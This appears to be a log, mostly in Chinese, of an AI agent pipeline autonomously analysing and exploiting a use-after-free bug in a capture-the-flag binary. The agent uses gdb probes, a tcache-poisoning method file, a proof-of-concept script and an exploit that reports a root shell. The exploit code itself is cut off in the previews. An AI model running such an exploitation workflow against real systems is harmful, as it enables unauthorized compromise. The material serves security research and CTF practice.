19:34:14 [impact:BUG-002] ← GLM(8.7s): 调工具[gdb_run]
19:34:14 [impact:BUG-002] 现在让我通过 gdb 验证 PRIM-002 —— 我需要植入结构体内存并验证 printf 是否读取了已释放的名称缓冲区。让我使用 gdb 来： 1. 获取 A 的已释放名称缓冲区地址 2. 植入 C 的名称缓冲区（位于 A 的旧结构体位置），包含 speak + freed_name_ptr 3
19:34:14 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *remove_animal+0x146; run; printf \"=== After remove A ===\\n\"; )
19:34:14 [impact:BUG-002]   ← gdb_run(0.1s): .14: 1) Add animal ⏎ [Detaching after vfork from child process 22473] ⏎ 2026/09/08 19:34.14: 2) Remove animal ⏎ [Detaching after vfork from child proc...(4212 chars)
19:34:14 [impact:BUG-002] → 调用 GLM...
19:34:26 [impact:BUG-002] ← GLM(11.5s): 调工具[gdb_run]
19:34:26 [impact:BUG-002] 很好。现在我可以看到： - A 的已释放名称缓冲区位于 0x4052c0，包含 tcache next = 0x0000000000000405 - B 的已释放名称缓冲区位于 0x405310，包含 tcache next = 0x00000000004056c5  现在我需要验证植入场景。让我使
19:34:26 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *remove_animal+0x146; b *print+0x35; run; printf \"=== After remo)
19:34:26 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4017bd ⏎ Breakpoint 2 at 0x4012c5 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-lin...(1501 chars)
19:34:26 [impact:BUG-002] → 调用 GLM...
19:34:50 [impact:BUG-002] ← GLM(24.5s): 调工具[write_file]
19:34:50 [impact:BUG-002] `print+0x35` 处的断点在每次 `print()` 调用时都会触发（它在各处都被使用）。输出很混乱，因为 `print` 被用于菜单显示。此外，C 的名称缓冲区输入是空的（我在 "24\n" 之后没有提供二进制数据）。  让我采取一种不同的方法。我将编写一个独立的 Python 脚本，使用
19:34:50 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: UAF Info Leak via Freed Name Pointer - Verification PoC\n\nPRIM-001: CRASH-based UAF read (stand)
19:34:50 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py
19:34:50 [impact:BUG-002] → 调用 GLM...
19:35:03 [impact:BUG-002] ← GLM(12.4s): 调工具[gdb_run]
19:35:03 [impact:BUG-002] 现在让我通过 gdb 正确验证 PRIM-002。我需要发送包含 speak 地址和已释放名称指针的二进制 payload。让我使用 `make_payload` 工具来创建二进制 payload，然后使用 `gdb_run` 配合 `payload_file`：  实际上，让我尝试一种不同的方法。
19:35:03 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *add_animal+0x226; run; continue; continue; printf \"=== After re)
19:35:03 [impact:BUG-002]   ← gdb_run(0.1s): cess 22673] ⏎ 2026/09/08 19:35.03: Name of animal? ⏎ > > [DEBUG] Animal is added to zone 1 ⏎  ⏎ Breakpoint 1, 0x0000000000401661 in add_animal () ⏎  ⏎...(4212 chars)
19:35:03 [impact:BUG-002] → 调用 GLM...
19:35:16 [impact:BUG-002] ← GLM(13.0s): 调工具[gdb_run]
19:35:16 [impact:BUG-002] 我明白了问题所在——`continue` 命令导致程序运行到了 `report_name`，该函数在 0x4018bf 处崩溃（SIGSEGV），因为 C 的名称缓冲区包含 "XXXX..."，这被当作函数指针加载了。程序在执行到植入步骤之前就崩溃了。  问题在于执行顺序：在添加 C 之后，程序继续
19:35:16 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *report_name+0x100; run; printf \"=== At call rdx in report_name )
19:35:16 [impact:BUG-002]   ← gdb_run(0.1s): d process 22821] ⏎ 2026/09/08 19:35.16: 1) Parrot ⏎ [Detaching after vfork from child process 22824] ⏎ 2026/09/08 19:35.16: 2) Panda ⏎ > [Detaching af...(4200 chars)
19:35:16 [impact:BUG-002] → 调用 GLM...
19:35:29 [impact:BUG-002] ← GLM(12.7s): 调工具[gdb_run]
19:35:29 [impact:BUG-002] 我明白了问题所在！`rax = 0x5858585858585858` —— 这是来自 C 的名称缓冲区的 "XXXXXXXX" 值。但是 `zoo[0]` 应该指向 C 的名称缓冲区（即 A 的旧结构体地址 0x4052a0），而不是 0x5858585858585858。  等等，让我重新阅读一
19:35:29 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *report_name+0xc6; run; printf \"=== At report_name+0xc6 (after l)
19:35:29 [impact:BUG-002]   ← gdb_run(0.1s): taching after vfork from child process 22987] ⏎ 2026/09/08 19:35.29: Name of animal? ⏎ > > [DEBUG] Animal is added to zone 1 ⏎  ⏎ [Detaching after vfo...(4210 chars)
19:35:29 [impact:BUG-002] → 调用 GLM...
19:35:45 [impact:BUG-002] ← GLM(16.0s): 调工具[gdb_run]
19:35:45 [impact:BUG-002] 太棒了！这是 PRIM-002 的决定性证据！让我来分析一下发生了什么：  1. **在 report_name+0xc6 处的断点**：`rax = 0x4052a0`（来自 `zoo[0]` 的结构体指针，指向 C 的名称缓冲区 = A 的旧结构体内存）  2. **植入前**：`0x4052a
19:35:45 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *report_name+0xc6; run; printf \"=== rax = zoo[idx] = 0x%lx ===\\)
19:35:45 [impact:BUG-002]   ← gdb_run(0.1s):  (max: 64 characters) ⏎ > [Detaching after vfork from child process 23162] ⏎ 2026/09/08 19:35.45: Name of animal? ⏎ > > [DEBUG] Animal is added to zon...(4208 chars)
19:35:45 [impact:BUG-002] → 调用 GLM...
19:36:26 [impact:BUG-002] ← GLM(40.7s): 调工具[write_file]
19:36:26 [impact:BUG-002] **这是 PRIM-002 (INFO_LEAK) 的决定性证据！**  在植入并继续执行后，程序输出： ``` 2026/09/08 19:35.45: ÅV@ ```  `ÅV@` 是以下字节的 ASCII 表示： - `\xc5` = Å (0xc5) - `\x56` = V (0x56) 
19:36:26 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: HEAP_USE_AFTER_FREE_INFO_LEAK_VIA_FREED_NAME_POINTER\n==========================================)
19:36:26 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py
19:36:26 [impact:BUG-002] → 调用 GLM...
19:36:31 [impact:BUG-002] ← GLM(5.1s): 调工具[run_script]
19:36:31 [impact:BUG-002] 让我运行 PoC 来验证 PRIM-001：
19:36:31 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py", "timeout": 15})
19:36:31 [impact:BUG-002]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-002: UAF Info Leak via Freed Name Pointer ⏎ ==...(1539 chars)
19:36:31 [impact:BUG-002] → 调用 GLM...
19:38:30 [impact:BUG-002] ← GLM(118.8s): 调工具[submit_final_result]
19:38:30 [impact:BUG-002] PRIM-001 已验证 (rc=-11, SIGSEGV)。PRIM-002 已通过 gdb 证据验证。  现在让我整合所有发现并提交最终报告。让我总结一下关键发现：  **BUG-002 分析总结：**  1. **PRIM-001 (CRASH / UAF 读取)**：在 `remove_an
19:38:30 [impact:BUG-002] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，21134 chars）
19:38:30 [impact:BUG-002] → 调用 GLM...
19:38:45 [impact:BUG-002] ← GLM(15.1s)
19:38:45 [impact:BUG-002] BUG-002 的 S3 Primitive 分析与验证已完成。以下是工作总结：  ## BUG-002: 通过已释放名称指针引发的 UAF 信息泄露  ### 发现并验证了两个 Primitive：  **PRIM-001 (CRASH - UAF 读取已释放堆元数据)** - 已验证 - 在 `
19:38:45 [stage3] 保存 → /work/workspace/0019-2022-35-uaf-20260908-191003/stage3.json
19:38:45 --- S4 Exploit ---
19:38:45 === exploit (bug_id=-) ===
19:38:45 [exploit] → 调用 GLM...
19:38:53 [exploit] ← GLM(8.5s): 调工具[read_file, disassemble]
19:38:53 [exploit] 我将首先分析 S1/S2/S3 报告，然后加载匹配的技能，再编写 exploit。  **S1/S2/S3 的关键发现：** - 无 PIE，部分 RELRO，NX，Canary，glibc 2.39 - UAF：`remove_animal` 释放结构体但未将 `zoo[idx]` 置为 NULL
19:38:53 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/tcache-poisoning/SKILL.md", "limit": 1000})
19:38:53 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "get_shell"})
19:38:53 [exploit]   ← disassemble(0.0s): 0000000000401276 <get_shell>: ⏎   401276:	endbr64 ⏎   40127a:	push   rbp ⏎   40127b:	mov    rbp,rsp ⏎   40127e:	lea    rax,[rip+0xd83]        # 402008...(298 chars)
19:38:53 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: tcache-poisoning ⏎  3  description: UAF→tcache链表伪造→任意地址分配→任意写。通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # Tcache Poisoning ⏎  7   ⏎  8  ## 适用条...(2047 chars)
19:38:53 [exploit] → 调用 GLM...
19:38:59 [exploit] ← GLM(5.5s): 调工具[disassemble, disassemble]
19:38:59 [exploit] 技能已加载。现在让我更仔细地理解确切的 tcache 填充技术。S3 报告确认： - glibc 2.39 具有 safe-linking (fd 已异或)，但 S3 的方法不需要进行 fd poisoning — 它使用 **tcache 填充** 来打破结构体/名称的 LIFO 配对 - 填充 
19:38:59 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "report_name"})
19:38:59 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal"})
19:38:59 [exploit]   ← disassemble(0.0s): 00000000004017bf <report_name>: ⏎   4017bf:	endbr64 ⏎   4017c3:	push   rbp ⏎   4017c4:	mov    rbp,rsp ⏎   4017c7:	sub    rsp,0x10 ⏎   4017cb:	mov    r...(2735 chars)
19:38:59 [exploit]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(4020 chars)
19:38:59 [exploit] → 调用 GLM...
19:39:14 [exploit] ← GLM(15.4s): 调工具[probe_io]
19:39:14 [exploit] 现在我完全理解了这个漏洞利用路径。让我确认一下关键细节：  1. `report_name` 在 0x40189d 处：`rdx = [rax]` (struct+0x00 = 函数指针)，在 0x4018b8 处：`rax = [rax+0x10]` (名称指针)，在 0x4018bc 处：`rd
19:39:14 [exploit]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "steps": "[{\"recv_until\": \":\", \"send\": \"1\"}, {\"recv_until\": \":\", \"s)
19:39:14 [exploit]   ← probe_io(0.1s): RECV: b'2026/09/08 19:' ⏎ SEND: '1' ⏎ RECV: b'39.14:' ⏎ SEND: '1' ⏎ RECV: b' Welcome to ABC Zoo!!!\n2026/09/08 19:' ⏎ SEND: '24' ⏎ RECV: b'39.14:' ⏎ S...(194 chars)
19:39:14 [exploit] → 调用 GLM...
19:39:17 [exploit] ← GLM(3.0s): 调工具[probe_io]
19:39:17 [exploit] 我看到菜单使用了时间戳前缀。让我通过更完整的交互来更好地理解 I/O 模式。
19:39:17 [exploit]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "steps": "[{\"recv_until\": \":\", \"send\": \"1\"}, {\"recv_until\": \":\", \"s)
19:39:18 [exploit]   ← probe_io(0.1s): RECV: b'2026/09/08 19:' ⏎ SEND: '1' ⏎ RECV: b'39.18:' ⏎ SEND: '1' ⏎ RECV: b' Welcome to ABC Zoo!!!\n2026/09/08 19:' ⏎ SEND: '24' ⏎ RECV: b'39.18: 1) A...(505 chars)
19:39:18 [exploit] → 调用 GLM...
19:39:58 [exploit] ← GLM(40.1s): 调工具[write_file]
19:39:58 [exploit] 我现在明白了 I/O 模式。菜单使用了带有时间戳前缀的 `print()`。提示词如下： - 菜单：`> `（在时间戳之后） - 添加动物：`Type of animal?` → `1) Parrot / 2) Panda` → `> `，然后是 `How long is the name? (ma
19:39:58 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nS4 Exploit: UAF via tcache fill -> function pointer control -> get_shell\nTarget)
19:39:58 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/exploit.py
19:39:58 [exploit] → 调用 GLM...
19:40:00 [exploit] ← GLM(2.3s): 调工具[run_script]
19:40:00 [exploit] 现在让我运行 exploit 来测试它。
19:40:00 [exploit]   → 工具 run_script({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003/exploit.py", "timeout": 30})
19:40:07 [exploit]   ← run_script(6.8s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ [*] [Shell] id: b'uid=0(root) gid=0(root) groups=0(root)\n' ⏎ LEANAGENT_SUCCESS ⏎ --- rest...(3245 chars)
19:40:07 [exploit] → 调用 GLM...
19:41:03 [exploit] ← GLM(56.6s): 调工具[submit_final_result]
19:41:03 [exploit] 漏洞利用在第一次尝试时就成功了。证据很明确：  - **已获取 Shell**：`PWNED_SHELL_SUCCESS` 回显已确认 - **id 输出**：`uid=0(root) gid=0(root) groups=0(root)` — root shell - **已读取 Flag**：`
19:41:03 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，14351 chars）
19:41:03 [exploit] → 调用 GLM...
19:41:13 [exploit] ← GLM(9.6s)
19:41:13 [exploit] Exploit 已成功完成。总结：  **利用路线**: UAF tcache 填充 → 函数指针覆写 → get_shell (ROUTE-01)  **攻击链**: 1. **设置**: 添加 4 只动物 (name_len=24)，移除全部 4 只 → 8 次 free → tcache 0x
19:41:13 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
19:41:13 [stage4] 保存 → /work/workspace/0019-2022-35-uaf-20260908-191003/stage4.json
19:41:40 📄 渗透报告：/work/workspace/0019-2022-35-uaf-20260908-191003/report.md
=== 主 agent 汇总 ===
分析完成！以下是结果摘要：

## 漏洞分析结果

| 项目 | 结果 |
|------|------|
| **二进制路径** | `/work/ctf2/0019-2022-35-uaf/target` |
| **漏洞类型** | UAF（Use-After-Free，释放后使用） |
| **Exploit 是否成功** | ✅ **成功** |
| **Exploit 脚本路径** | `/work/workspace/0019-2022-35-uaf-20260908-191003/exploit.py` |
| **完整分析报告** | `/work/workspace/0019-2022-35-uaf-20260908-191003/report.md` |
| **工作区目录** | `/work/workspace/0019-2022-35-uaf-20260908-191003/` |

### 总结

完整 S1-S4 漏洞分析流程已跑通：
- **S1 侦察** → 识别二进制类型、保护机制
- **S2 语义** → 定位 UAF 漏洞点（释放后仍可访问的内存引用）
- **S3 原语验证** → 确认可利用的内存原语
- **S4 Exploit** → 成功生成并验证 exploit，**利用成功**

工作区中包含完整产物（`stage1-4.json`、`exploit.py`、`report.md`、`full_run.log`），可进一步查看报告了解详细的漏洞机制和利用路径。
